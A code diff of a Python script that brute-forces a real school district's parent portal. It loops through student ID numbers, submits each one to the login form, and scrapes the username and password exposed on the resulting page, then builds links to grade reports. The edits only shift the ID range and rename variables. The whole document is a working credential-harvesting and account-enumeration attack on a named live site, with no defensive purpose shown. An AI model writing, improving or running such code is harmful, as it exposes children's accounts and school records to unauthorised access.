@@ -3,18 +3,17 @@ import mechanize
 from bs4 import BeautifulSoup
 import time
 
+# Declare vars
+domain = "https://dashboard.okaloosaschools.com"
 br = mechanize.Browser()
 br.set_handle_equiv(True)
 br.set_handle_redirect(True)
 br.set_handle_referer(True)
 br.set_handle_robots(False)
-
-# Set colors
 green = fg('#00FF00')
 red = fg('#FF0000')
 orange = fg('#FFFF00')
 res = attr('reset')
-
 
 # Set user class
 class user:
@@ -35,21 +34,8 @@ class smurf:
     randid = "N/A"
 
 
-# Declare vars
-user = user()
-domain = "https://dashboard.okaloosaschools.com"
-
-
-# Declare custom strip function
-def downwithit(string, firstHalf, secondHalf):
-    string = str(string)
-    format1 = string.replace(str(firstHalf), "")
-    format2 = format1.replace(str(secondHalf), "")
-    return format2
-
-
 # Main function
-for x in range(4630051162, 4699999999):
+for x in range(4624021143, 4699999999):
     br.open(domain + "/parentportal/PP000.pgm")
     br.select_form(nr=0)
     user.studentid = str(x)
@@ -65,8 +51,8 @@ for x in range(4630051162, 4699999999):
               + "Found " + user.fullname + "..." + res)
         soup = BeautifulSoup(br.response().read(), 'lxml')
         redirect = str(soup)[63:146]
-        dashboard = domain + redirect
-        br.open(dashboard)
+        smurf.full= domain + redirect
+        br.open(smurf.full)
         soup = BeautifulSoup(br.response().read(), 'lxml')
 
         # Get username/password
@@ -75,7 +61,8 @@ for x in range(4630051162, 4699999999):
             tempCombo.append(span.text)
         user.username = tempCombo[0]
         user.password = tempCombo[1]
-        smurf.id = dashboard[69:101]
+        smurf.id = smurf.full[69:101]
+        smurf.randid = smurf.full[-9:]
         finalSmurf = domain + "/parentportal/PP013.pgm?SmurfId= " + \
             smurf.id + "&wrkcycle=02&wrkgrd=11&rcyear=2022"
 
